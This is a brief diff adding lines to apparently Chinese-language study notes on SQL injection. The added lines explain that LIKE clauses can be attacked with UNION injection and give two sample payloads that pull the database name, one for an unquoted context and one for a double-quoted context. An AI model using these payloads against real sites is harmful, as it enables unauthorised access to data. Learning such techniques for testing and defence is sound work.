@@ -24,3 +24,12 @@ orderby利用：因为排序差异可使用布尔盲注，或者时间盲注，�
 
 ^
 like可以使用联合注入。
+like一般也在where语句之后。
+```
+1、where like xx
+where like 'admin' union select 1,2,3,database()
+
+2、where like "xx"
+where like " admin" union select 1,2,3,database()-- "
+
+```
